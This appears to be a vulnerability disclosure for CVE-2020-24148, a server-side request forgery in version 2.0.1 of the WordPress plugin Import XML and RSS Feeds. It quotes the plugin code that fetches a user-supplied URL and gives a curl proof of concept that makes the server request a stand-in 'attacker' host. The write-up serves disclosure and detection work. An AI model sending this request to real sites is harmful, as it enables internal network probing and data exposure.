# CVE-2020-24148

Server-side request forgery (SSRF) in the Import XML and RSS Feeds _(import-xml-feed)_ plugin **2.0.1** for WordPress via the `data` parameter in a `moove_read_xml` action.

## Vulnerable code:

`/moove-actions.php`:

```php
...
	public function moove_read_xml() {

		$args = array(
			'data' 		=> esc_sql( wp_unslash( $_POST['data'] ) ),
			'xmlaction'	=> sanitize_text_field( wp_unslash( $_POST['xmlaction'] ) ),
			'type'		=> sanitize_text_field( wp_unslash( $_POST['type'] ) ),
			'node'		=> sanitize_text_field( wp_unslash( $_POST['node'] ) ),
		);
		$move_importer = new Moove_Importer_Controller;
		$read_xml = $move_importer->moove_read_xml( $args );
		echo $read_xml;
		die();
	}
```

`/controllers/moove-controller.php`:

```php
class Moove_Importer_Controller {
	...
    public function moove_importer_get_content( $url ) {
        /* gets the data from a URL */

        $ch = curl_init();
        $timeout = 5;
        $user_agent = "Mozilla/5.0 (X11; Linux i686; rv:24.0) Gecko/20140319 Firefox/24.0 Iceweasel/24.4.0";

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_USERAGENT,$user_agent);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION,true);
        curl_setopt($ch, CURLOPT_AUTOREFERER, 1);   
        curl_setopt($ch, CURLOPT_COOKIEFILE, '');
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        $data = curl_exec($ch);

        $errors = curl_error($ch);
        $response = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        curl_close($ch);

        return $data;
    }
    public function moove_read_xml( $args ) {
        $return_array = array();
        $parent       = false;
        if ( $args['type'] === 'url' ) :
            $xml_string = Moove_Importer_Controller::moove_importer_get_content( $args['data'] );
            $xml_string = htmlspecialchars_decode( $xml_string );
    ...
```

## Proof-of-Concept

```bash
$ curl \
	-s "http://host/wp-admin/admin-ajax.php?action=moove_read_xml" \
	-d "type=url&data=http%3A%2F%2Fattacker%2F&xmlaction=preview&node=0"
```

## References

- [Nuclei templates](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-24148.yaml)
- [import-xml-feed:2.0.1](https://plugins.svn.wordpress.org/import-xml-feed/tags/2.0.1/)